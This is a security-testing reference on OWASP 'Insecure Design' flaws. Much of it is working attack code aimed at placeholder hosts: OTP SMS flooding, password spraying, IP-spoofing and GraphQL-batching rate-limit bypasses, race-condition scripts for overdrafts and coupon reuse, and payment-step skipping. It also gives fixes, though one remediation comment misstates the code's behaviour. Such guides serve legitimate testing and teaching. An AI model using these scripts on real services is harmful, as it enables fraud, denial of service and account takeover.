# A04: Insecure Design

OWASP #4. New category in 2021. Design flaws vs implementation bugs.
CWEs: CWE-209, CWE-256, CWE-501, CWE-522, CWE-311.
Design flaws cannot be fixed by perfect implementation—they require redesign.

---

## Overview

Insecure design encompasses missing or ineffective security controls at the
architecture level. Different from insecure implementation: even perfect code
cannot fix a flawed design.

**Attack classes:**
- Rate limiting bypass (business logic)
- Business logic flaws (workflow manipulation)
- Threat modeling gaps (unmodeled attack paths)
- Trust boundary violations
- Insecure credential recovery flows
- Missing function-level security requirements

---

## Detection Methods

```bash
# Rate limiting test
for i in {1..50}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target.com/api/send-otp \
    -d "phone=+15555555555"
done
# If never throttled → rate limiting absent

# Business logic: test extreme values
curl -d "quantity=-1&item=123" https://target.com/cart/add    # negative quantity
curl -d "amount=0.001" https://target.com/payment/process     # fractional/near-zero
curl -d "coupon=SAVE100&coupon=SAVE100&coupon=SAVE100" https://target.com/checkout  # coupon stacking

# Credential recovery weakness
curl -d "email=victim@example.com" https://target.com/forgot-password
# Test: what's the reset mechanism? Security questions = insecure design

# Workflow order violation
# Normally: browse → add to cart → pay → confirm
# Skip pay step: browse → add to cart → confirm directly
curl -b cookies.txt https://target.com/order/confirm
```

---

## What to Look For

**Rate limiting absent:**
- OTP/SMS: unlimited requests (cost/availability attack)
- Login: no lockout
- Password reset: unlimited attempts at reset token
- File uploads: unlimited size/count
- API calls: no per-user/per-IP quota

**Business logic flaws:**
- Negative quantity in shopping cart → refund exploitation
- Price calculated client-side (tamper to reduce)
- Coupon stacking (apply multiple discounts)
- Currency rounding abuse (0.001 * 1000 = 1.0 but billed as 0)
- Parallel requests to bypass single-use constraints
- Workflow step skipping (complete step 3 without step 2)
- Integer overflow (add 2^63 to balance)

**Trust boundary violations:**
- Server trusting client-provided totals/roles/permissions
- Deserialization of user data without validation
- Client-side price/discount calculation accepted server-side

**Credential recovery:**
- Security questions (CWE-640 - "mother's maiden name")
- Reset link valid for >24 hours
- Reset token reusable
- Recovery bypasses MFA entirely
- Same security level not required for recovery as login

---

## Testing Methodology

### 1. Rate Limiting Bypass
```bash
# Basic rate limit detection
seq 1 100 | xargs -I{} -P10 curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST https://target.com/api/send-verification-code \
  -d "phone=+15555555555"

# IP-based rate limit bypass
for ip in 1.1.1.{1..50}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "X-Forwarded-For: $ip" \
    -H "X-Real-IP: $ip" \
    -d "username=admin&password=test" \
    https://target.com/login
done

# Account-based distribution (password spray)
for user in $(cat userlist.txt); do
  curl -s -d "username=$user&password=Summer2024!" https://target.com/login
  sleep 1  # Slow, stays under per-IP rate limits
done

# GraphQL batching bypass
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "mutation{login(user:\"admin\",pass:\"pass1\"){token}}"},
    {"query": "mutation{login(user:\"admin\",pass:\"pass2\"){token}}"},
    {"query": "mutation{login(user:\"admin\",pass:\"pass3\"){token}}"},
    {"query": "mutation{login(user:\"admin\",pass:\"pass4\"){token}}"},
    {"query": "mutation{login(user:\"admin\",pass:\"pass5\"){token}}"}
  ]'
# 5 login attempts in 1 HTTP request, bypasses per-request rate limiting
```

### 2. Business Logic Flaws
```bash
# Negative quantity → negative price
curl -b session.txt -X POST https://target.com/cart/update \
  -d "item_id=LAPTOP&quantity=-1"
# Then checkout → negative total → credit to account?

# Price manipulation
# Intercept checkout, modify price:
# {"item": "laptop", "price": 0.01, "quantity": 1}

# Free shipping threshold manipulation
# Add item worth $49.99 to get free shipping on $50 threshold
# Then remove item but check if shipping is still free

# Workflow bypass - skip payment
SESSION=$(curl -c /tmp/cookies -d "user=attacker&pass=pass" \
  https://target.com/login -L -s | grep -o 'session=[^;]*')
# Add to cart
curl -b /tmp/cookies -d "item=1&qty=1" https://target.com/cart/add
# Skip payment, go directly to order confirmation
curl -b /tmp/cookies https://target.com/order/complete
# If "Order placed!" returned → payment bypass

# Time-of-check time-of-use (TOCTOU)
# Balance check: $100
# Simultaneous transactions:
for i in {1..20}; do
  curl -b session.txt -X POST https://target.com/transfer \
    -d "amount=100&to=attacker" &
done
wait
# Multiple requests may all pass the $100 balance check before any debit
```

### 3. Threat Modeling Gap Analysis
```
# Ask: "What attack paths exist that weren't in the design?"

# Common unmodeled paths:
1. Password reset flow used to bypass MFA
   - Reset password → new session has full access?
   - MFA not required after password reset?

2. Account linking/OAuth used to take over accounts
   - Can I link attacker's OAuth to victim's account?
   - Is email verification required before account merge?

3. API version confusion
   - v2 endpoint has auth checks
   - v1 endpoint (deprecated, not removed) doesn't
   - GET /api/v1/admin/users vs /api/v2/admin/users

4. Excessive data returned in API responses
   - GET /api/profile returns: {"id":1,"name":"User","password_hash":"$2y$..."}
   - Not displayed in UI but in API response

5. Forget to throttle "low-impact" endpoints
   - /api/check-username → enumeration oracle
   - /api/check-coupon → brute force coupon codes
   - /api/resend-email → spam relay
```

### 4. Coupon/Discount Abuse
```bash
# Coupon stacking
curl -b cookies.txt -X POST https://target.com/apply-coupon \
  -d "code=SAVE10&code=SAVE10&code=SAVE10"

# Timing attack on single-use coupons
for i in {1..10}; do
  curl -b cookies.txt -X POST https://target.com/checkout \
    -d "coupon=SINGLE_USE_CODE" &
done
wait
# Race condition: multiple redemptions before database marks as used

# Referral code self-referral
# Register with referral_code=YOUR_OWN_CODE
# If app gives referral bonus to both parties → free money

# Gift card/balance transfer loop
# Wallet A: $100 → Transfer to B: $100 → Transfer back to A: $100?
# Race condition timing
```

---

## Exploitation Techniques

### Race Condition - Balance Overdraft
```python
import threading, requests

session = requests.Session()
session.cookies.set('session', 'YOUR_SESSION_TOKEN')

def transfer():
    r = session.post('https://target.com/transfer',
                     json={'amount': 1000, 'to_account': 'attacker'})
    print(f"Status: {r.status_code}, Response: {r.text[:100]}")

threads = [threading.Thread(target=transfer) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

### Workflow Skip - Order Without Payment
```python
import requests

s = requests.Session()
# Login
s.post('https://target.com/login', data={'user': 'attacker', 'pass': 'password'})

# Add expensive item to cart
s.post('https://target.com/cart', data={'item': 'iphone', 'qty': 1})

# Skip payment - go directly to order confirmation
r = s.get('https://target.com/order/confirm')
if 'order_id' in r.text.lower():
    print("Payment bypass successful!")
    print(r.text[:500])
```

### OTP Exhaustion Attack
```python
import requests, concurrent.futures

def send_otp(i):
    r = requests.post('https://target.com/api/send-otp',
                      json={'phone': '+15555555555'})
    print(f"Request {i}: {r.status_code}")

# Flood OTP endpoint - causes:
# 1. Victim gets hundreds of SMS = DoS
# 2. If quota-based, can exhaust provider budget
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
    list(ex.map(send_otp, range(200)))
```

---

## Verification

```bash
# Verify rate limiting works
for i in {1..20}; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -d "email=test@example.com" https://target.com/forgot-password)
  echo "Request $i: $CODE"
done
# Expected: 429 after ~5 requests

# Verify business logic bounds checking
curl -d "quantity=-100&item=laptop" https://target.com/cart
# Response should not contain negative price

# Verify workflow cannot be skipped
SESSION_NEW=$(curl -c /tmp/fresh.txt https://target.com/ -s && cat /tmp/fresh.txt | grep session)
curl -b /tmp/fresh.txt https://target.com/order/complete
# Should redirect to cart/checkout, not place an order
```

---

## Common Problems & Solutions

| Design Flaw | Impact | Correct Design |
|-------------|--------|----------------|
| No rate limiting on OTP | DoS + enumeration | 3 SMS/hour per number, exponential backoff |
| Client-side price calculation | Price manipulation | Server calculates all totals from product catalog |
| Security questions for recovery | Guessable recovery | Time-limited token via secondary channel |
| MFA bypassed via password reset | Full auth bypass | Password reset must re-enroll MFA or require it |
| Single-use codes race condition | Multiple redemptions | Atomic DB transaction: check-and-mark in single op |
| Workflow step order not enforced | Skip payments | State machine: enforce step sequence server-side |
| API returns excessive data | Data over-exposure | Explicit field whitelisting in API responses |
| No TOCTOU protection | Race condition exploits | Database-level locking / serializable transactions |

---

## Tools (with Commands)

```bash
# Turbo Intruder (Burp plugin) - race condition testing
# Load Race Single-Packet Attack template
# 20 simultaneous requests

# Race condition with curl
time_transfer() {
  curl -s -b session.txt -X POST https://target.com/use-coupon \
    -d "code=ONCE_ONLY" &
}
for i in {1..20}; do time_transfer; done
wait

# Business logic fuzzing with ffuf
ffuf -u https://target.com/cart/add \
  -X POST \
  -d "item=1&quantity=FUZZ" \
  -w /usr/share/seclists/Fuzzing/Integers/Integers-Small.txt \
  -H "Cookie: session=TOKEN"

# Arjun - discover hidden parameters that affect logic
arjun -u https://target.com/checkout --stable

# OWASP ASVS checklist tool
# Manual: asvs.owasp.org - section V1 (Architecture)
```

---

## Bypass Techniques

### IP-Based Rate Limit Bypass
```
X-Forwarded-For: 10.0.0.{increment}
X-Real-IP: spoofed
CF-Connecting-IP: spoofed
True-Client-IP: spoofed

# Or use different source ports / rotate through proxies
# Residential proxies for distributed attacks
```

### GraphQL Batching
```graphql
# Single HTTP request, many operations
[
  {"query": "mutation{sendOTP(phone:\"+1555...\")}"},
  {"query": "mutation{sendOTP(phone:\"+1555...\")}"},
  ... repeat 100x ...
]
```

### Concurrent Request Race Conditions
```python
# Turbo Intruder's single-packet attack
# All requests sent in one TCP packet, arrive simultaneously
# Server processes them concurrently → race window
# Use Burp Suite extension "Turbo Intruder"
```

---

## Remediation

```python
# Atomic operation for single-use coupon
from django.db import transaction

def use_coupon(user, coupon_code):
    with transaction.atomic():
        # SELECT FOR UPDATE prevents concurrent use
        coupon = Coupon.objects.select_for_update().get(code=coupon_code, used=False)
        coupon.used = True
        coupon.used_by = user
        coupon.save()
        # Apply discount
        apply_discount(user, coupon.value)
        return True
    # If exception (already used) → rollback → False returned

# Rate limiting
from functools import wraps
from time import time

request_counts = {}

def rate_limit(max_per_minute):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            key = request.remote_addr + request.path
            now = time()
            counts = request_counts.get(key, [])
            counts = [t for t in counts if t > now - 60]  # Last minute only
            if len(counts) >= max_per_minute:
                return jsonify(error="Rate limit exceeded"), 429
            counts.append(now)
            request_counts[key] = counts
            return f(*args, **kwargs)
        return wrapper
    return decorator

@app.route('/send-otp', methods=['POST'])
@rate_limit(3)  # Max 3 per minute
def send_otp():
    ...
```

---

## Real-World CVEs / Incidents

| Incident | Year | Design Flaw | Impact |
|----------|------|-------------|--------|
| Twitter 2020 | 2020 | No rate limit + insufficient MFA on admin tools | 130 accounts compromised |
| Robinhood 2020 | 2020 | Instant settlement design allowed infinite margin | ~$1M in trades executed without funds |
| Grubhub 2019 | 2019 | Duplicate order race condition | Free food via duplicate requests |
| SolarWinds 2020 | 2020 | No integrity check on updates (design gap) | 18,000 orgs backdoored |
| Starbucks 2015 | 2015 | Balance transfer loop race condition | Unlimited free balance |
| Microsoft Teams 2021 | 2021 | GIF webhook as SSRF vector | Account takeover via malicious GIF |
